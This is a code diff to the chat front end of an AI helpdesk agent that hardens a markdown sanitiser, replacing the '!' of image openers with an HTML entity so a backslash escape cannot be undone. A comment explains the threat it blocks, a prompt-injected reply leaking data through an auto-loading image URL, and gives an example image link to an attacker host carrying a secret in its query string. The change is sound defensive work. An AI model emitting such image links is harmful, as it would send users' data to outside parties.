@@ -15,10 +15,12 @@ load_dotenv(Path(__file__).parent / ".env")  # must run before the agent reads A
 from app_implementation import MCP_SERVER_URL, AgentReply, HelpdeskAgent, ToolEvent  # noqa: E402
 
 # Markdown images load automatically, so a prompt-injected reply could leak data through
-# an image URL (e.g. ![](https://attacker.example/?q=secret)). Escaping every image opener
-# neutralises all image forms (inline and reference-style). Links are kept: they need a click.
+# an image URL (e.g. ![](https://attacker.example/?q=secret)). Replacing the "!" of every
+# image opener with its HTML entity neutralises all image forms (inline and reference-style),
+# whatever backslashes precede it; a backslash escape alone can be cancelled by another
+# backslash. Links are kept: they need a click.
 IMAGE_OPENER = "!["
-ESCAPED_IMAGE_OPENER = "\\!["
+NEUTRALISED_IMAGE_OPENER = "&#33;["
 
 TOOL_ICONS = {"RAG": "📚", "Client tool": "🕒", "Server tool": "🌐", "MCP": "🎫"}
 SAMPLE_PROMPTS = [
@@ -48,7 +50,7 @@ def render_tool_event(event: ToolEvent):
 
 
 def sanitize_markdown(text: str) -> str:
-    return text.replace(IMAGE_OPENER, ESCAPED_IMAGE_OPENER)
+    return text.replace(IMAGE_OPENER, NEUTRALISED_IMAGE_OPENER)
 
 
 def render_reply(reply: AgentReply):
